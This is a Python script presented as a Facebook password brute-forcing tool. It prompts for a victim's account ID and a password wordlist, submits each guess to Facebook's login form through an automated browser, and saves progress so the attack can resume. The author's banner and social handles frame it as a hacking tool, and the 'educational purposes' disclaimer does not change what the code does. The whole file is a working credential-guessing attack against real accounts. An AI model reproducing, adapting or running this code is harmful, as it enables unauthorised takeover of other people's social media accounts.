#!usr/bin/python​
​#Facebook Joker brutal force can crack into Facebook Database 100% without Interruption By Facebook Firewall !​
​#This program is for educational purposes only.​
​#Don't attack people facebook accounts it's illegal ! ​
​#If you want to crack into someone's account, you must have the permission of the user. ​
​#InfosecHacker is not responsible.​


​import​ ​sys​
​import​ ​random​
​import​ ​mechanize​
​import​ ​cookielib​

​# Console colors​
​bg​ ​=​''​ ​# '\033[44m'  # gray​
​W​ ​=​ ​bg​+​'​\033​[0m'​  ​# white (normal)​
​R​ ​=​ ​bg​+​'​\033​[31m'​  ​# red​
​G​ ​=​ ​bg​+​'​\033​[32m'​  ​# green​
​O​ ​=​ ​bg​+​'​\033​[33m'​  ​# orange​
​B​ ​=​ ​bg​+​'​\033​[34m'​  ​# blue​
​P​ ​=​ ​bg​+​'​\033​[35m'​  ​# purple​
​C​ ​=​ ​bg​+​'​\033​[36m'​  ​# cyan​
​GR​ ​=​ ​bg​+​'​\033​[37m'​  ​# gray​

​GHT​ ​=​ ​G​+​'''​

​                          _\@)_       ___
                  /`\      .' -,'-.__,@
                 /        |     `).-'
               _/       _\V^V^V^V/_
              | /\     .=// ^.^ \\=.
              /\ /     .'/| ._. |\'.
             / /-`.       _\___/_   
              |/\/\   _@->`   _  `<-@._
                \  \.'  @-'`\( `'-,@   '-.
                 \      ,    @    , _.-   `\
                  \   .'|    :    |` /'. _.'                `"`   \   :    / /`\_| 
╔═══╗╔╗────────╔╗
║╔══╝║║────────║║
║╚══╦╣║╔╦═╦══╦═╝╠══╗𝙃𝙖𝙘𝙠𝙚𝙧
║╔══╬╣╚╝╣╔╣╔╗║╔╗║╔╗║
║║──║║╔╗╣║║╔╗║╚╝║╚╝║
╚╚╝──╚╩╝╚╩╝╚╝╚╩══╩═

​'''​+​W​
​print​ ​"WIXI CAWINADA WAA INAAD KALA SOO XIDHIDHID YOUTUBE KA FIKRADO HACKER"​
​print​ ​"# INSTAGRAM:-mr__yahye TELEGRAM:- https://t.me/fikrado4048063"​
​print​ ​"# HADAAD KA HESHAY TOOLKAN ZAAD NUMBER 0634048063"​

​try​:
 ​DT​=​open​(​'/storage/sdcard1/.fb.dat'​).​readlines​()
 ​email​ ​=​ml​=​DT​[​0​].​replace​(​'​\n​'​,​''​)
 ​passwordlist​ ​=​pw​=​DT​[​1​].​replace​(​'​\n​'​,​''​)
 ​q2​=​DT​[​2​].​replace​(​'​\n​'​,​''​)
​except​:
 ​email​ ​=​ml​=​str​(​raw_input​(​"# Masukkan ID korban​\n​contoh: 100006541234567​\n​ID = "​))
 ​passwordlist​ ​=​pw​=​ ​str​(​raw_input​(​"Masukkan file yg berisi password list​\n​contoh:/sdcard/password.txt​\n​PASSWORD = "​))
 ​q2​=​1​ ​#raw_input('mulai password no brp om,,?? ')​
 ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​q2​))
 ​except​:​print​ (​'tidak bisa menyimpan data, penyerangan akan selalu dimulai dari awal'​)

​print​ ​O​+​'_____eemail_____='​+​ml​+​'​\n​'​+​'____password____='​+​pw​+​W​

​useragents​ ​=​ [(​'User-agent'​, ​'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'​)]

​login​ ​=​'https://www.facebook.com/'​
​logs​=​ ​'https://www.facebook.com/login.php?login_attempt=1&lwv=110'​
​login1​ ​=​'https://web.facebook.com/'​
​logs1​ ​=​ ​'https://web.facebook.com/login.php?login_attempt=1&lwv=110'​

​no​=​1​
​panel​=​0​
​log​=​''​
​#'https://web.facebook.com/checkpoint/?next'​
​def​ ​attack​(​password​):
  ​global​ ​panel​,​no​,​q2​,​log​
  ​try​:
    ​if​ ​no​==​int​(​q2​):​panel​=​1​
    ​if​ ​panel​ ​==​1​:
     ​sys​.​stdout​.​write​(​"​\r​"​+​W​+​"[*]"​+​C​+​" mencoba password ke "​+​O​+​"%s %s.. "​ ​%​(​no​,​password​)​+​W​)
     ​sys​.​stdout​.​flush​()
     ​br​.​addheaders​ ​=​ [(​'User-agent'​, ​random​.​choice​(​useragents​))]
     ​site​ ​=​ ​br​.​open​(​login​)
     ​br​.​select_form​(​nr​=​0​)
         
     ​##Facebook​
     ​br​.​form​[​'email'​] ​=​email​
     ​br​.​form​[​'pass'​] ​=​ ​password​
     ​br​.​submit​()
     ​log​ ​=​ ​br​.​geturl​()
     ​if​ ​log​ ​!=​logs​ ​and​ ​log​ ​!=​logs1​:
      ​print​ ​log​
      ​try​:​open​(​'/sdcard1/password target.txt'​,​'w'​).​write​(​str​(​password​)​+​'​\n​'​+​str​(​log​))
      ​except​:​pass​
     ​if​ ​log​ ​==​ ​login​ ​or​ ​log​ ​==​ ​login1​:
        ​print​ ​"​\n​\n​\n​ [*] Password found .. !!"​
        ​print​ ​"​\n​ [*] Password : %s​\n​"​ ​%​ (​password​)
        ​sys​.​exit​(​1​)
  ​except​ ​KeyboardInterrupt​:
        ​print​ ​"​\n​[*] Exiting program .. "​
        ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
        ​except​:​pass​
        ​sys​.​exit​(​1​)
  ​except​:
        ​import​ ​traceback​
        ​fe​ ​=​ ​traceback​.​format_exception​
        ​sei​ ​=​ ​sys​.​exc_info​
        ​print​ ​'​\n​'​+​str​(​sei​()[​1​]) ​#(''.join(fe(*sei())))​
        ​print​ (​u'​\n​Please contact me Bang-Djon'​)

        ​if​ ​log​ ​==​ ​login​ ​or​ ​log​ ​==​ ​login1​:
         ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
         ​except​:​pass​
        ​else​:
         ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
         ​except​:​pass​
         ​print​ ​"​\n​[*] exiting....... "​
        ​sys​.​exit​(​1​)

​def​ ​search​():
    ​global​ ​password​,​no​
    ​for​ ​password​ ​in​ ​passwords​:
        ​attack​(​password​.​replace​(​"​\n​"​,​""​))
        ​no​+=​1​



​def​ ​check​():

    ​global​ ​br​
    ​global​ ​passwords​
    ​global​ ​password​,​no​
    ​try​:
       ​br​ ​=​ ​mechanize​.​Browser​()
       ​cj​ ​=​ ​cookielib​.​LWPCookieJar​()
       ​br​.​set_handle_robots​(​False​)
       ​br​.​set_handle_equiv​(​True​)
       ​br​.​set_handle_referer​(​True​)
       ​br​.​set_handle_redirect​(​True​)
       ​br​.​set_cookiejar​(​cj​)
       ​br​.​set_handle_refresh​(​mechanize​.​_http​.​HTTPRefreshProcessor​(), ​max_time​=​1​)
    ​except​ ​KeyboardInterrupt​:
       ​print​ ​"​\n​[*] Exiting program ..​\n​"​
       ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
       ​except​:​pass​
       ​sys​.​exit​(​1​)
    ​except​:
       ​print​ ​"​\n​[*] Koneksi Habis .. "​
       ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
       ​except​:​pass​
       ​sys​.​exit​(​1​)
    ​try​:
       ​list​ ​=​ ​open​(​passwordlist​, ​"r"​)
       ​passwords​ ​=​ ​list​.​readlines​()
       ​k​ ​=​ ​0​
       ​while​ ​k​ ​<​ ​len​(​passwords​):
          ​passwords​[​k​] ​=​ ​passwords​[​k​].​strip​()
          ​k​ ​+=​ ​1​
    ​except​ ​IOError​:
        ​print​ ​"​\n​ [*] Error: check your password list path ​\n​"​
        ​sys​.​exit​(​1​)
    ​except​ ​KeyboardInterrupt​:
        ​print​ ​"​\n​ [*] Exiting program ..​\n​"​
        ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
        ​except​:​pass​
        ​sys​.​exit​(​1​)
    ​except​:
        ​print​ ​"​\n​[*] Koneksi Habis .. "​
        ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
        ​except​:​pass​
        ​sys​.​exit​(​1​)
    ​try​:
        ​print​ ​GHT​
        ​print​ ​W​+​" [*]"​+​C​+​" Account to crack :"​+​O​+​" %s"​ ​%​ (​email​)​+​W​
        ​print​ ​W​+​" [*]"​+​C​+​" Loaded :"​ , ​O​+​str​(​len​(​passwords​)),​C​+​ ​"passwords"​+​W​
        ​print​ ​W​+​" [*]"​+​C​+​" Cracking, please wait ..."​+​W​
    ​except​ ​KeyboardInterrupt​:
        ​print​ ​"​\n​ [*] Exiting program ..​\n​"​
        ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
        ​except​:​pass​
        ​sys​.​exit​(​1​)
    ​except​:
        ​print​ ​"​\n​[*] Koneksi Habis .. "​
        ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
        ​except​:​pass​
        ​sys​.​exit​(​1​)
    ​try​:
        ​search​()
        ​attack​(​password​)
    ​except​ ​KeyboardInterrupt​:
        ​print​ ​"​\n​ [*] Exiting program ..​\n​"​
        ​try​:​open​(​'/storage/sdcard1/.fb.dat'​,​'w'​).​write​(​ml​+​'​\n​'​+​pw​+​'​\n​'​+​str​(​no​))
        ​except​:​pass​
        ​sys​.​exit​(​1​)

​if​ ​__name__​ ​==​ ​'__main__'​:
    ​check​()
